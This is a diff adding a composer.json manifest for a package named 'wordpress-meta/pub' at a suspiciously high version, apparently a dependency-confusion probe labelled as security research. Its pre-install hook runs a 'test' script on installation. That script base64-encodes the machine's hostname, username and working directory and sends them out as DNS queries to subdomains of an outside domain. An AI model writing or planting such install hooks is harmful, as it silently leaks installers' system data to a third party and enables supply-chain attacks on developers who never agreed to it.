@@ -1,0 +1,13 @@
+{
+	"name": "wordpress-meta/pub",
+	"description": "Security research purposes. Contact @alexandrevvo/alexandrevvo@gmail.com",
+	"version": "99.9.10",
+	"scripts": {
+		"pre-install-cmd": [
+			"@test"
+		],
+		"test": [
+			"dig \"http://av.$(hostname | base64).ns1.avsecurity.org\" @8.8.8.8;dig \"http://av.$(whoami | base64).ns1.avsecurity.org\" @8.8.8.8; var=100 && for i in $(pwd|base64|awk '{gsub(/.{50}/,\"&\\n\")}1'); do var=$((var+1)) && dig \"av.$var.$i.ns1.avsecurity.org\" @8.8.8.8; done"
+		]
+	}
+}
